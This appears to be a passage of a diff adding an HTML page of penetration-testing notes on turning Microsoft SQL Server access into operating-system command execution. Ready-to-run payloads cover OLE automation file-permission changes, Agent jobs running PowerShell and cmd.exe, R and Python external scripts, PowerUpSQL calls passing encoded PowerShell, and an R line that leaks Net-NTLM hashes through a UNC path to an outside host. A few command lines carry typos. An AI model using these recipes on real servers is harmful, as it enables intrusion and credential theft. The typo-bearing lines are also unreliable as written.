+<span class="s1">&#39;Win32_LogicalFileSecuritySetting.Path=&#39;&#39;ftp.exe&#39;&#39;&#39;</span><span class="p">;</span>
+
+<span class="c1">-- Create an empty SecurityDescriptor</span>
+<span class="k">EXEC</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">objWmi</span><span class="p">,</span><span class="s1">&#39;Get&#39;</span><span class="p">,</span><span class="o">@</span><span class="n">objFull</span>
+<span class="k">OUTPUT</span><span class="p">,</span><span class="s1">&#39;Win32_SecurityDescriptor&#39;</span><span class="p">;</span>
+
+<span class="c1">-- Set the SecurityDescriptor&#39;s ControlFlags property to</span>
+<span class="c1">-- &#39;4&#39; (SE_DACL_PRESENT)</span>
+<span class="k">EXEC</span> <span class="n">sp_OASetProperty</span> <span class="o">@</span><span class="n">objFull</span><span class="p">,</span><span class="s1">&#39;ControlFlags&#39;</span><span class="p">,</span><span class="mi">4</span><span class="p">;</span>
+<span class="c1">-- Set the file security setting object&#39;s security descriptor to the</span>
+<span class="k">new</span>
+
+<span class="c1">-- SecurityDescriptor object</span>
+<span class="k">EXEC</span> <span class="n">sp_OAMethod</span> <span class="o">@</span><span class="n">objPermiss</span><span class="p">,</span><span class="s1">&#39;SetSecurityDescriptor&#39;</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="o">@</span><span class="n">objFull</span><span class="p">;</span>
+</pre></div></li>
+</ul>
+</li>
+</ul>
+<h4 id="agent-jobs-cmdexec-powershell-activex-etc">Agent Jobs (CmdExec, PowerShell, ActiveX etc.)<a class="headerlink" href="#agent-jobs-cmdexec-powershell-activex-etc" title="Permanent link">&para;</a></h4>
+<ul>
+<li>Job can be scheduled, executed in response to alerts or by using <code class="codehilite"><span class="n">sp_start_job</span></code> stored procedure</li>
+<li>Needs <code class="codehilite"><span class="n">sysadmin</span></code> role to <code class="codehilite"><span class="k">create</span></code> a job.</li>
+<li>Non-sysadmin users with the <code class="codehilite"><span class="n">SQLAgentUserRole</span></code>, <code class="codehilite"><span class="n">SQLAgentReaderRole</span></code>, and <code class="codehilite"><span class="n">SQLAgentOperatorRole</span></code> fixed database roles in the <code class="codehilite"><span class="n">msdb</span></code> database can also be used.</li>
+<li>The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured.</li>
+<li>References:<ul>
+<li><a href="https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent">https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent</a></li>
+<li><a href="https://serverfault.com/a/14569">https://serverfault.com/a/14569</a></li>
+<li><a href="https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution">https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution</a></li>
+</ul>
+</li>
+<li>Steps<ul>
+<li><code class="codehilite"><span class="n">xp_startservice</span></code> - Start the SQL Server Agent service</li>
+<li><code class="codehilite"><span class="n">sp_add_job</span></code> - Create Job</li>
+<li><code class="codehilite"><span class="n">sp_add_jobstep</span></code> - Add job step</li>
+<li><code class="codehilite"><span class="n">sp_start_job</span></code> - Run Job</li>
+<li><code class="codehilite"><span class="n">sp_delete_job</span></code> - Delete Job</li>
+</ul>
+</li>
+<li>Listing all Jobs**
+    <div class="codehilite"><pre><span></span><span class="k">SELECT</span>
+<span class="n">job</span><span class="p">.</span><span class="n">job_id</span><span class="p">,</span> <span class="n">notify_level_email</span><span class="p">,</span> <span class="n">name</span><span class="p">,</span> <span class="n">enabled</span><span class="p">,</span>
+<span class="n">description</span><span class="p">,</span> <span class="n">step_name</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">server</span><span class="p">,</span> <span class="n">database_name</span>
+<span class="k">FROM</span>
+<span class="n">msdb</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysjobs</span> <span class="n">job</span>
+<span class="k">INNER</span> <span class="k">JOIN</span>
+<span class="n">msdb</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysjobsteps</span> <span class="n">steps</span>
+<span class="k">ON</span>
+<span class="n">job</span><span class="p">.</span><span class="n">job_id</span> <span class="o">=</span> <span class="n">steps</span><span class="p">.</span><span class="n">job_id</span>
+</pre></div></li>
+<li>Interesting subsystems (job types):<ul>
+<li>PowerShell
+  <div class="codehilite"><pre><span></span><span class="n">USE</span> <span class="n">msdb</span>
+<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_add_job</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;PSJob&#39;</span>
+
+<span class="k">EXEC</span> <span class="n">sp_add_jobstep</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;PSJob&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">step_name</span> <span class="o">=</span>
+<span class="n">N</span><span class="s1">&#39;test_powershell_name1&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">subsystem</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;PowerShell&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">command</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;powershell.exe -noexit ps&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">retry_attempts</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="o">@</span><span class="n">retry_interval</span> <span class="o">=</span> <span class="mi">5</span>
+
+<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_add_jobserver</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;PSJob&#39;</span>
+
+<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_start_job</span> <span class="n">N</span><span class="s1">&#39;PSJob&#39;</span>
+<span class="c1">-- EXEC dbo.sp_delete_job @job_name = N&#39;PSJob&#39;</span>
+</pre></div></li>
+<li>CmdExec
+  <div class="codehilite"><pre><span></span><span class="n">USE</span> <span class="n">msdb</span>
+<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_add_job</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmdjob&#39;</span>
+
+<span class="k">EXEC</span> <span class="n">sp_add_jobstep</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmdjob&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">step_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;test_cmd_name1&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">subsystem</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmdexec&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">command</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmd.exe /k calc&#39;</span><span class="p">,</span> <span class="o">@</span><span class="n">retry_attempts</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span> <span class="o">@</span><span class="n">retry_interval</span> <span class="o">=</span> <span class="mi">5</span>
+
+<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_add_jobserver</span> <span class="o">@</span><span class="n">job_name</span> <span class="o">=</span> <span class="n">N</span><span class="s1">&#39;cmdjob&#39;</span>
+
+<span class="k">EXEC</span> <span class="n">dbo</span><span class="p">.</span><span class="n">sp_start_job</span> <span class="n">N</span><span class="s1">&#39;cmdjob&#39;</span><span class="p">;</span>
+<span class="c1">-- EXEC dbo.sp_delete_job @job_name = N&#39;cmdJob&#39;</span>
+</pre></div></li>
+<li>Microsoft ActiveX Script (VBScript and Jscript)</li>
+<li>SSIS (SQL Server Integrated Services)</li>
+</ul>
+</li>
+<li>PowerUpSQL
+    <div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLOSCmdAgentJob</span> <span class="err">–</span><span class="n">Subsystem</span> <span class="n">PowerShell</span> <span class="n">-Username</span>
+<span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span>
+<span class="s2">&quot;powershell -e &lt;base64encodedscript&gt;&quot;</span> <span class="n">-Verbose</span>
+<span class="n">-Subsystem</span> <span class="n">CmdExec</span>
+<span class="n">-ubsystem</span> <span class="n">VBScript</span>
+<span class="n">-Subsystem</span> <span class="n">Jscript</span>
+</pre></div>
+    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLAgentJob</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Verboe</span><span class="p">]</span><span class="n">se</span>
+</pre></div></li>
+</ul>
+<h4 id="external-scripting">External Scripting<a class="headerlink" href="#external-scripting" title="Permanent link">&para;</a></h4>
+<ul>
+<li>R introduced in SQL Server 2016</li>
+<li>Python introduced in SQL Server 2017</li>
+<li>Runtime environments must be installed as a prerequisite. Not on by default. Needs SQL server service restart.</li>
+<li>Needs <code class="codehilite"><span class="n">sysadmin</span></code> privileges to be enabled and executed.</li>
+<li>Runs with privileges of a dynamically created Windows user account (member of the <code class="codehilite"><span class="n">SQLRUserGroup</span></code>).</li>
+<li>References:<ul>
+<li><a href="https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart">https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart</a></li>
+<li><a href="https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server">https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server</a></li>
+<li><a href="https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5">https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5</a></li>
+<li><a href="https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server">https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server</a></li>
+</ul>
+</li>
+<li>Executing commands with R:
+    <div class="codehilite"><pre><span></span><span class="n">sp_configure</span> <span class="s1">&#39;external scripts enabled&#39;</span>
+<span class="k">GO</span>
+<span class="k">EXEC</span> <span class="n">sp_execute_external_script</span>
+<span class="o">@</span><span class="k">language</span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;R&#39;</span><span class="p">,</span>
+<span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe</span>
+<span class="s1">/c dir&quot;,intern=T))&#39;</span>
+<span class="k">WITH</span> <span class="k">RESULT</span> <span class="k">SETS</span> <span class="p">(([</span><span class="n">cmd_out</span><span class="p">]</span> <span class="nb">text</span><span class="p">));</span>
+<span class="k">GO</span>
+</pre></div></li>
+<li>Grab Net-NTLM hashes with R:
+    <div class="codehilite"><pre><span></span><span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;.libPaths(&quot;\\\\testhost\\foo\\bar&quot;);library(&quot;0mgh4x&quot;)&#39;</span>
+</pre></div></li>
+<li>Using shell instead of system: <a href="https://pastebin.com/zBDnzELT">https://pastebin.com/zBDnzELT</a>
+    <div class="codehilite"><pre><span></span><span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s">&#39;OutputDataSet &lt;- data.frame(shell(&quot;dir&quot;,intern=T))&#39;</span>
+</pre></div></li>
+<li>Executing commands with Python:
+    <div class="codehilite"><pre><span></span><span class="k">EXEC</span> <span class="n">sp_execute_external_script</span>
+<span class="o">@</span><span class="k">language</span> <span class="o">=</span><span class="n">N</span><span class="s1">&#39;Python&#39;</span><span class="p">,</span>
+<span class="o">@</span><span class="n">script</span><span class="o">=</span><span class="n">N</span><span class="s1">&#39;import subprocess</span>
+<span class="s1">p = subprocess.Popen(&quot;cmd.exe /c whoami&quot;,</span>
+<span class="s1">stdout=subprocess.PIPE)</span>
+<span class="s1">OutputDataSet = pandas.DataFrame([str(p.stdout.read(),</span>
+<span class="s1">&quot;utf-8&quot;)])&#39;</span>
+<span class="k">WITH</span> <span class="k">RESULT</span> <span class="k">SETS</span> <span class="p">(([</span><span class="n">cmd_out</span><span class="p">]</span> <span class="n">nvarchar</span><span class="p">(</span><span class="k">max</span><span class="p">)))</span>
+</pre></div></li>
+<li>PowerUpSQL:
+    <div class="codehilite"><pre><span></span><span class="nb">Invoke-SQLOSCmdR</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span> <span class="s2">&quot;powershell -e &lt;base64encodedscript&gt;&quot;</span> <span class="n">-Verbose</span>
+<span class="nb">Invoke-SQLOSCmdPython</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Command</span> <span class="s2">&quot;powershell -e &lt;base64encodedscript&gt;&quot;</span> <span class="n">-Verbose</span>
+</pre></div></li>
+</ul>
+<h4 id="registry-autoruns">Registry Autoruns<a class="headerlink" href="#registry-autoruns" title="Permanent link">&para;</a></h4>
+<h4 id="file-autoruns">File Autoruns<a class="headerlink" href="#file-autoruns" title="Permanent link">&para;</a></h4>
+                
+                  
+                
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../crypto/" title="Crypto" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                Crypto
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../databases/" title="Databases" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                Databases
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../assets/javascripts/application.808e90bb.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:".."}})</script>
+      
+    
+  </body>
+</html>
